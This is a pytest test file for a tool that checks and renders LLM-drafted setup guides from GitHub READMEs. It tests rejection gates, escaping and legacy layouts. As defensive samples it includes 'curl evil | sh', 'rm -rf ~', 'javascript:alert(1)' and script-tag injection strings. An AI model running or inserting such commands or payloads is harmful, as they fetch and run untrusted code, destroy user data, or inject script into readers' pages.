"""The how-to guide: what the gates refuse, how it renders, and that older drafts still render as before."""

import copy
import json
import xml.etree.ElementTree as ET

import pytest

from radar import digest, gates, readme, svg
from radar.labels import L
from tests.support import GUIDE_T, README, TREE, make_draft

FACTS = {"full_name": "example-org/sample-agent-kit", "url": "https://github.com/example-org/sample-agent-kit",
         "description": "Run AI agents", "readme": README, "stars": 24000, "forks": 2400, "open_issues": 12, "license": "MIT",
         "language": "Python", "languages": ["Python"], "topics": ["llm"], "created": "2024-11-14", "pushed": "2026-10-09",
         "age_years": 1, "tree": TREE + ["src/planner.py", "src/memory.py", "src/tools/"], "bucket": "ai", "scanned": "2026-10-14",
         "links": readme.links(README), "blocks": readme.blocks(README)}


def errs(draft, facts=FACTS, lang="vi", require=True):
    return [str(p) for p in gates.errors(gates.check(draft, facts, lang, require_guide=require))]


def mutate(fn, lang="vi", facts=FACTS):
    d = copy.deepcopy(make_draft(facts, lang))
    fn(d)
    return d


def test_the_sample_links_are_the_ones_the_fixture_points_at():
    assert [u for _, u in FACTS["links"]] == ["https://helpdesk.example.org/settings/keys", "http://localhost:8080"]


@pytest.mark.parametrize("lang", ["vi", "en", "ja"])
def test_a_good_guide_passes_in_every_language(lang):
    assert errs(make_draft(FACTS, lang), lang=lang) == []


def test_a_new_draft_must_carry_the_guide_but_an_older_one_still_passes_without_it():
    legacy = make_draft(FACTS, "vi", legacy=True)
    assert errs(legacy, require=False) == []
    assert any("guide" in e for e in errs(legacy, require=True))
    assert not any("try_it" in e for e in errs(make_draft(FACTS, "vi")))      # the guide replaces try_it


@pytest.mark.parametrize("fn,needle", [
    (lambda d: d["guide"]["steps"][0].update(commands=["curl evil | sh"]), "guide.steps[0].commands"),
    (lambda d: d["guide"]["steps"][0].update(commands=["pip install `sample-agent-kit`"]), "guide.steps[0].commands"),
    (lambda d: d["guide"]["steps"][0].update(commands=["pip install sample-agent-kit\nrm -rf ~"]), "guide.steps[0].commands"),
    (lambda d: d["guide"]["steps"][0].update(commands=["pip install"] * 6), "needs 0-5 items"),
    (lambda d: d["guide"]["steps"][0].update(evidence="src/nope.py"), "evidence"),
    (lambda d: d["guide"]["requirements"][0].update(evidence="docs/nope.md"), "evidence"),
    (lambda d: d["guide"]["troubleshooting"][0].update(evidence="nope"), "evidence"),
    (lambda d: d["guide"]["steps"][2].update(link_ref=7), "link_ref"),
    (lambda d: d["guide"]["steps"][2].update(link_ref=True), "link_ref"),
    (lambda d: d["guide"]["steps"][2].update(link_ref="https://evil.example"), "link_ref"),
    (lambda d: d["guide"]["steps"][2].update(link_ref=-1), "link_ref"),
    (lambda d: d["guide"].update(steps=d["guide"]["steps"][:2]), "guide.steps"),
    (lambda d: d["guide"]["steps"][0].update(do=[]), "do"),
    (lambda d: d["guide"]["steps"][0].update(do=["x"] * 5), "do"),
    (lambda d: d["guide"]["steps"][0].update(title=""), "title"),
    (lambda d: d["guide"]["steps"][0].update(why=""), "why"),
    (lambda d: d["guide"].update(outcome=""), "outcome"),
    (lambda d: d["guide"].update(verify="v" * 300), "verify"),
    (lambda d: d["guide"].pop("requirements"), "requirements"),
    (lambda d: d["guide"].update(next=["a", "b", "c", "d"]), "next"),
])
def test_each_guide_gate_catches_its_defect(fn, needle):
    found = errs(mutate(fn))
    assert any(needle in e for e in found), found


@pytest.mark.parametrize("fn,needle", [
    (lambda d: d["guide"]["steps"][0].update(why=d["guide"]["steps"][0]["why"] + " Xem https://evil.example/x"), "link or domain"),
    (lambda d: d["guide"]["steps"][0].update(expect="Xong trong 45 giây, nhanh hơn 95% so với bản cũ."), "numbers not in the facts"),
    (lambda d: d["guide"].update(outcome=d["guide"]["outcome"] + " Đây là công cụ tốt nhất thế giới."), "hype"),
    (lambda d: d["guide"]["steps"][0]["do"].append("Chạy `rm -rf ~` để dọn dẹp."), "is not in the README or the repository"),
    (lambda d: d["guide"]["steps"][0]["do"].append("Chạy `sample-agent run để thử."), "unbalanced backtick"),
    (lambda d: d["guide"]["next"].append("Mở [trang này](b) nhé"), "link or domain"),
    (lambda d: d["guide"]["troubleshooting"][0].update(fix="Xem evil[.]com để biết thêm"), "link or domain"),
    (lambda d: d["guide"]["requirements"][0].update(detail="Cần 64 GB bộ nhớ."), "numbers not in the facts"),
])
def test_the_text_gates_reach_every_sentence_of_the_guide(fn, needle):
    found = errs(mutate(fn))
    assert any(needle in e for e in found), found


def test_a_code_span_may_name_the_readme_or_a_file_of_the_repository():
    ok = mutate(lambda d: d["guide"]["steps"][0]["do"].append("Mở `config.example.toml`, rồi xem `src/planner.py` và `pyproject.toml`."))
    assert errs(ok) == []


def test_a_command_the_readme_splits_over_lines_is_given_as_one_line():
    one = mutate(lambda d: d["guide"]["steps"][4].update(commands=["sample-agent console --port 8080"]))
    assert errs(one) == []
    half = mutate(lambda d: d["guide"]["steps"][4].update(commands=["sample-agent console"]))
    assert any("guide.steps[4].commands" in e for e in errs(half))


def test_a_guide_without_commands_is_refused_when_the_readme_has_them():
    bare = mutate(lambda d: [s.update(commands=[]) for s in d["guide"]["steps"]])
    assert any("gives none" in e for e in errs(bare))
    # a README with no code blocks gives the guide nothing to copy, and that is allowed
    plain = {**FACTS, "readme": "# Tool\n\nA desktop app. Download it, put your key in config.toml, and drag a video onto the window.\n"}
    assert errs(bare, plain) == []


def test_a_thin_guide_is_a_warning_not_an_error():
    big = {**FACTS, "readme": FACTS["readme"] + "\n```bash\npip install a\npip install b\npip install c\npip install d\n```\n"}
    thin = mutate(lambda d: [s.update(commands=[]) for s in d["guide"]["steps"][1:]], facts=big)
    thin["guide"]["steps"][0]["commands"] = ["pip install sample-agent-kit"]
    problems = gates.check(thin, big, "vi", require_guide=True)
    assert not gates.errors(problems) and any(p.level == "warn" and "uses 1 of" in p.message for p in problems)
    used, wanted = gates.command_coverage(thin, big)
    assert (used, wanted) == (1, 8)


def test_coverage_counts_distinct_readme_commands_the_draft_uses():
    used, wanted = gates.command_coverage(make_draft(FACTS, "vi"), FACTS)
    assert (used, wanted) == (4, 4)


def test_a_link_ref_may_point_at_a_link_that_exists():
    assert errs(mutate(lambda d: d["guide"]["steps"][2].update(link_ref=1))) == []
    no_links = {k: v for k, v in FACTS.items() if k != "links"}
    assert any("link_ref" in e for e in errs(mutate(lambda d: d["guide"]["steps"][2].update(link_ref=0)), no_links))


# ---- rendering ---------------------------------------------------------------------------------------------

def render(tmp_path, draft, lang="vi", facts=FACTS):
    digest.render_repo(tmp_path, "2026-10-14", facts, {lang: draft})
    folder = digest.repo_dir(tmp_path, "2026-10-14", facts)
    return folder, (folder / f"{lang}.md").read_text(encoding="utf-8")


def test_the_digest_leads_with_the_outcome_then_what_to_prepare_then_every_step(tmp_path):
    folder, md = render(tmp_path, make_draft(FACTS, "vi"))
    t = L["vi"]
    order = [t["outcome"], t["before"], t["roadmap"], t["do_steps"], f"{t['step']} 1 · Cài gói", f"{t['step']} 5 · ", t["verify"], t["trouble"],
             t["next"], t["inside"], t["learn"]]
    positions = [md.index(x) for x in order]
    assert positions == sorted(positions), dict(zip(order, positions))
    assert "- [ ] **Python và pip**" in md                                 # a checklist the reader ticks off
    assert "```bash\npip install sample-agent-kit\n```" in md
    assert "```bash\nsample-agent console --port 8080\n```" in md          # joined from the README's two lines
    assert "path-vi.svg" in md and (folder / "path-vi.svg").exists()
    assert t["expect"] in md and "Hàng đợi hiện ra." in md


def test_a_readme_address_is_printed_by_the_renderer_and_a_local_one_is_code(tmp_path):
    _, md = render(tmp_path, make_draft(FACTS, "vi"))
    assert f"{L['vi']['get_link']}: [the helpdesk key page](https://helpdesk.example.org/settings/keys)" in md
    assert "`http://localhost:8080`" in md and "](http://localhost:8080)" not in md


def test_a_stored_link_that_is_not_a_plain_address_is_never_printed(tmp_path):
    hostile = {**FACTS, "links": [["click", "javascript:alert(1)"], ["x", "https://a.example/(b)"], ["y", "https://ok.example.org/p"]]}
    d = mutate(lambda d: d["guide"]["steps"][2].update(link_ref=0), facts=hostile)
    d["guide"]["requirements"][1]["link_ref"] = 1
    _, md = render(tmp_path, d, facts=hostile)
    assert "javascript" not in md and "a.example" not in md
    d2 = mutate(lambda d: d["guide"]["steps"][2].update(link_ref=2), facts=hostile)
    assert "[y](https://ok.example.org/p)" in render(tmp_path / "again", d2, facts=hostile)[1]


def test_fields_cannot_turn_into_headings_or_lists_in_the_guide(tmp_path):
    d = mutate(lambda d: (d["guide"]["steps"][0].update(why="# Tiêu đề lạ", expect="- mục lạ"), d["guide"].update(verify="> trích dẫn")))
    _, md = render(tmp_path, d)
    assert "\n# Tiêu đề lạ" not in md and "**Mục đích:** \\# Tiêu đề lạ" in md
    assert "\n> trích dẫn" not in md


def test_the_draft_with_its_guide_is_kept_and_the_links_it_points_at_with_it(tmp_path):
    folder, _ = render(tmp_path, make_draft(FACTS, "vi"))
    stored = json.loads((folder / "draft-vi.json").read_text(encoding="utf-8"))
    assert stored["draft"]["guide"]["steps"][2]["link_ref"] == 0 and stored["facts"]["links"] == FACTS["links"]
    assert stored["draft"]["guide"]["steps"][2]["snippet_ref"] == 0 and stored["facts"]["blocks"] == FACTS["blocks"]


def test_a_draft_from_before_the_guide_renders_exactly_the_older_layout(tmp_path):
    folder, md = render(tmp_path, make_draft(FACTS, "vi", legacy=True))
    assert L["vi"]["try"] in md and L["vi"]["do_steps"] not in md and not (folder / "path-vi.svg").exists()
    assert "```bash\npip install sample-agent-kit\nsample-agent run --queue support\n```" in md
    old = {k: v for k, v in FACTS.items() if k not in ("links", "blocks")}
    folder2, _ = render(tmp_path / "old", make_draft(old, "vi", legacy=True), facts=old)
    stored_facts = json.loads((folder2 / "draft-vi.json").read_text(encoding="utf-8"))["facts"]
    assert "links" not in stored_facts and "blocks" not in stored_facts


@pytest.mark.parametrize("lang", ["vi", "en", "ja"])
def test_the_roadmap_is_wellformed_and_escapes_hostile_text(lang):
    g = copy.deepcopy(make_draft(FACTS, lang)["guide"])
    g["steps"][0]["title"] = '<script>alert(1)</script> & "x"'
    out = svg.roadmap(g["steps"], L[lang]["roadmap"], g["outcome"], L[lang])
    root = ET.fromstring(out)
    assert root.tag.endswith("svg") and "<script>" not in out and "&lt;script&gt;" in out
    assert GUIDE_T[lang]["steps"][1][0] in out


def test_the_roadmap_survives_ten_long_steps():
    steps = [{"title": "Một bước rất dài " * 6, "why": "Giải thích cũng rất dài " * 12, "commands": ["a"] * (i % 6)} for i in range(10)]
    ET.fromstring(svg.roadmap(steps, "Lộ trình", "Kết quả " * 40, L["vi"]))


def test_the_index_of_a_run_says_what_each_guide_ends_with_and_how_many_steps_it_has(tmp_path):
    legacy_facts = {**FACTS, "full_name": "example-org/sample-old", "url": "https://github.com/example-org/sample-old"}
    entries = [{"facts": FACTS, "drafts": {"vi": make_draft(FACTS, "vi")}},
               {"facts": legacy_facts, "drafts": {"vi": make_draft(legacy_facts, "vi", legacy=True)}}]
    digest.render_index(tmp_path, "2026-10-14", entries, "vi")
    text = (tmp_path / "digests" / "2026-10-14" / "README.md").read_text(encoding="utf-8")
    assert f"🎯 {GUIDE_T['vi']['outcome']} · 🪜 5 {L['vi']['steps_n']}" in text
    assert text.count("🎯") == 1                         # a draft from before the guide gets no such line


# ---- a model may answer with any JSON: the gates must return Problems, never raise ---------------------------

ODD = [None, 1, True, "`x`", [], ["a"], [1], {}, {"a": 1}]


def paths(node, prefix=()):
    """Every key path of a draft: a list is entered by position, so each element is mutated on its own."""
    yield prefix
    if isinstance(node, dict):
        for k, v in node.items():
            yield from paths(v, prefix + (k,))
    elif isinstance(node, list):
        for i, v in enumerate(node):
            yield from paths(v, prefix + (i,))


def replace_at(draft, path, value):
    d = copy.deepcopy(draft)
    if not path:
        return value
    node = d
    for key in path[:-1]:
        node = node[key]
    node[path[-1]] = value
    return d


def test_the_gates_never_raise_whatever_shape_a_model_sends_for_any_field():
    base = make_draft(FACTS, "vi")
    tried = 0
    for path in paths(base):
        for odd in ODD:
            draft = replace_at(base, path, odd)
            if not isinstance(draft, dict):
                continue
            gates.schema(draft)
            gates.check(draft, FACTS, "vi", require_guide=True)
            tried += 1
    assert tried > 1000


def test_a_draft_that_is_not_an_object_at_all_is_refused_by_the_caller_not_by_a_crash():
    from radar.llm import parse_json
    for text in ('["a"]', '"x"', "3", "null"):
        try:
            parse_json(text)
        except ValueError:
            pass
        else:
            raise AssertionError(f"parse_json accepted {text!r}")


def test_a_config_sample_is_printed_exactly_as_the_readme_has_it(tmp_path):
    _, md = render(tmp_path, make_draft(FACTS, "vi"))
    assert f"_{L['vi']['snippet']}_\n\n```toml\n[helpdesk]\nkey = \"YOUR_KEY\"\nqueue = \"support\"\n```" in md


def test_a_snippet_ref_must_name_a_block_the_readme_has():
    assert errs(mutate(lambda d: d["guide"]["steps"][2].update(snippet_ref=0))) == []
    for bad in (5, -1, True, "0", [0], 1.0):
        assert any("snippet_ref" in e for e in errs(mutate(lambda d: d["guide"]["steps"][2].update(snippet_ref=bad)))), bad
    no_blocks = {k: v for k, v in FACTS.items() if k != "blocks"}
    assert any("snippet_ref" in e for e in errs(mutate(lambda d: d["guide"]["steps"][2].update(snippet_ref=0)), no_blocks))


def test_a_stored_block_that_is_unsafe_is_never_printed(tmp_path):
    hostile = {**FACTS, "blocks": [["<script>", "x"], ["yaml", "a: 1\n" * 60], ["yaml", "k: ```\nv: 1"]]}
    d = mutate(lambda d: [d["guide"]["steps"][2].update(snippet_ref=1), d["guide"]["steps"][3].update(snippet_ref=2)], facts=hostile)
    _, md = render(tmp_path, d, facts=hostile)
    assert "a: 1\na: 1" not in md                                   # 60 lines: too long to print
    assert "````yaml\nk: ```\nv: 1\n````" in md                    # a fence inside the text gets a longer fence around it
    d = mutate(lambda d: d["guide"]["steps"][2].update(snippet_ref=0), facts=hostile)
    assert "<script>" not in render(tmp_path / "x", d, facts=hostile)[1]       # a language tag that is not plain is dropped


def test_stars_and_angle_brackets_in_the_guide_prose_stay_plain_text(tmp_path):
    d = mutate(lambda d: d["guide"]["steps"][0].update(why="Kích thước 1280*704 hoặc 704*1280, đặt <user> thay cho tên, xem `a<b*c`."))
    _, md = render(tmp_path, d)
    assert "1280\\*704 hoặc 704\\*1280" in md and "&lt;user>" in md and "`a<b*c`" in md


def test_the_coverage_rule_does_not_count_a_config_sample_as_a_command():
    assert gates.command_coverage(make_draft(FACTS, "vi"), FACTS) == (4, 4)


def test_a_stored_link_with_an_unparsable_host_is_never_printed_and_never_raises(tmp_path):
    hostile = {**FACTS, "links": [["x", "http://[HOST]:8080"], ["y", "https://ok.example.org/p"]]}
    d = mutate(lambda d: d["guide"]["steps"][2].update(link_ref=0), facts=hostile)
    _, md = render(tmp_path, d, facts=hostile)
    assert "[HOST]" not in md


CONSOLE_README = README + "\n```console\n> npm install x\nPS C:\\> pip install y\n$ make\n```\n"
CONSOLE_FACTS = {**FACTS, "readme": CONSOLE_README, "links": readme.links(CONSOLE_README), "blocks": readme.blocks(CONSOLE_README)}


def test_a_command_copied_with_its_prompt_is_shown_without_it_and_both_forms_pass_the_gate(tmp_path):
    for commands in (["> npm install x", "PS C:\\> pip install y", "$ make"], ["npm install x", "pip install y", "make"]):
        d = make_draft(CONSOLE_FACTS, "vi")
        d["guide"]["steps"][0].update(commands=commands, evidence="README")
        assert not any("commands" in e for e in errs(d, CONSOLE_FACTS)), commands
        md = render(tmp_path / str(len(commands[0])), d, facts=CONSOLE_FACTS)[1]
        assert "```bash\nnpm install x\npip install y\nmake\n```" in md and "> npm install" not in md and "PS C:" not in md


def test_the_commands_of_a_readme_with_a_prompt_count_as_coverage():
    d = make_draft(CONSOLE_FACTS, "vi")
    d["guide"]["steps"][0].update(commands=["npm install x"])
    assert gates.command_coverage(d, CONSOLE_FACTS)[1] == 7               # the four of the fixture plus the three prompted lines


def test_model_prose_in_the_tables_of_the_guide_is_shown_literally(tmp_path):
    d = mutate(lambda d: (d["guide"]["troubleshooting"][0].update(problem="Thiếu <MODEL> và *đậm* | cột", fix="Mở <details> và xem *chữ*"),
                          d["how_it_works"]["components"][0].update(name="Tên *x*", role="Vai <b>trò</b>")))
    _, md = render(tmp_path, d)
    row = next(line for line in md.splitlines() if "MODEL" in line)
    assert row.startswith("| Thiếu &lt;MODEL> và \\*đậm\\* \\| cột | Mở &lt;details> và xem \\*chữ\\* |")
    part = next(line for line in md.splitlines() if "Vai" in line)
    assert part.startswith("| **Tên \\*x\\*** | Vai &lt;b>trò&lt;/b> |")
    assert "<b>" not in md and "<details>" not in md


def test_the_image_alt_text_of_a_guide_cannot_close_the_image_or_open_markup(tmp_path):
    d = mutate(lambda d: d.update(title="Tên ] lạ <i>x</i> *y*"))
    first = render(tmp_path, d)[1].splitlines()[2]
    assert first == "![Tên  lạ ix/i y](card-vi.svg)"
